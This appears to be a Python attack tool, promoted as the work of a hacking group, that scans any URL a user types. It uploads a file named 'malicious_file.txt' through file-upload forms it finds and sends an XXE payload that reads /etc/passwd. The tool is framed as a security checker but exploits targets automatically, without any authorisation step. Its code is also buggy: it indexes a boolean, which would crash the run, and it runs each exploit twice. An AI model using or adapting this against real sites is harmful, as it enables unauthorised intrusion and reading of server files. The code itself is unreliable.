import requests
from bs4 import BeautifulSoup
from xml.sax import make_parser, handler
from termcolor import colored
import pyfiglet

# Global session object to maintain session state
session = requests.Session()

# Function to check for Insecure File Uploads vulnerability
def check_insecure_file_uploads(url):
    try:
        response = session.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            forms = soup.find_all('form')
            for form in forms:
                # Check if the form has file upload capability
                if 'file' in str(form).lower() and 'enctype' in form.attrs:
                    enctype = form.attrs['enctype'].lower()
                    if 'multipart/form-data' in enctype:
                        return True, form  # Return the form element to exploit it
            return False, None
        return False, None
    except requests.exceptions.RequestException:
        return False, None

# Function to check for XXE vulnerability
class XXEHandler(handler.ContentHandler):
    def __init__(self):
        self.found_root = False

    def startElement(self, name, attrs):
        if name == "root":
            self.found_root = True

def check_xxe_vulnerability(url):
    try:
        # Example payload to trigger XXE vulnerability
        payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root>&xxe;</root>'
        response = session.post(url, data=payload, headers={'Content-Type': 'application/xml'})
        return response.status_code == 200 and 'root:' in response.text
    except requests.exceptions.RequestException:
        return False

# Function to display results in a formatted table
def display_results(url, has_insecure_file_uploads, has_xxe_vulnerability):
    print(pyfiglet.figlet_format("Web Security Checker", font="slant", width=100))
    print("Don't forget to follow my Instagram account: " + colored("hhhZero", "blue"))
    print()
    print("This tool is made by orphan From a team  Lulzsec Black")
    print("Link to the team's channel on Telegram: " + colored("https://t.me/Luzsec_Black", "blue"))
    print()
    print(f"Results for {url}:")
    print("----------------------------------------------")
    print("|    Vulnerability         |     Status      |")
    print("----------------------------------------------")

    if has_insecure_file_uploads:
        print(f"| Insecure File Uploads    | {colored('Vulnerable', 'green')}  | Exploiting...")
        exploit_insecure_file_uploads(has_insecure_file_uploads[1])
    else:
        print(f"| Insecure File Uploads    | {colored('Not Vulnerable', 'red')} |")

    if has_xxe_vulnerability:
        print(f"| XXE Vulnerability         | {colored('Vulnerable', 'green')}  | Exploiting...")
        exploit_xxe_vulnerability(url)
    else:
        print(f"| XXE Vulnerability         | {colored('Not Vulnerable', 'red')} |")

    print("----------------------------------------------")

# Function to exploit Insecure File Uploads vulnerability
def exploit_insecure_file_uploads(form):
    try:
        print("Exploiting Insecure File Uploads vulnerability...")
        # Example: submit a file using the form
        payload = {'file': open('malicious_file.txt', 'rb')}
        response = session.post(form['action'], files=payload)
        if response.status_code == 200:
            print("Exploited successfully!")
        else:
            print("Failed to exploit Insecure File Uploads vulnerability.")
    except requests.exceptions.RequestException:
        print("Failed to exploit Insecure File Uploads vulnerability.")

# Function to exploit XXE vulnerability
def exploit_xxe_vulnerability(url):
    try:
        print("Exploiting XXE vulnerability...")
        # Example payload to trigger XXE vulnerability
        payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root>&xxe;</root>'
        response = session.post(url, data=payload, headers={'Content-Type': 'application/xml'})
        if response.status_code == 200 and 'root:' in response.text:
            print("Exploited XXE vulnerability successfully!")
        else:
            print("Failed to exploit XXE vulnerability.")
    except requests.exceptions.RequestException:
        print("Failed to exploit XXE vulnerability.")

# Main function to execute the program
def main():
    print()
    print(pyfiglet.figlet_format("Web Security Checker", font="slant", width=100))
    print("Don't forget to follow my Instagram account: " + colored("ahu_orphan", "blue"))
    print()
    print("This tool is made by orphan From a team  Lulzsec Black")
    print("Link to the team's channel on Telegram: " + colored("https://t.me/Luzsec_Black", "blue"))
    print()
    url = input("Enter the URL to check for vulnerabilities: ").strip()

    global session  # Ensure we use the global session object
    session = requests.Session()  # Initialize session

    has_insecure_file_uploads, vulnerable_form = check_insecure_file_uploads(url)
    has_xxe_vulnerability = check_xxe_vulnerability(url)

    display_results(url, has_insecure_file_uploads, has_xxe_vulnerability)

    # Exploit vulnerabilities if found
    if has_insecure_file_uploads:
        exploit_insecure_file_uploads(vulnerable_form)
    if has_xxe_vulnerability:
        exploit_xxe_vulnerability(url)

if __name__ == "__main__":
    main()

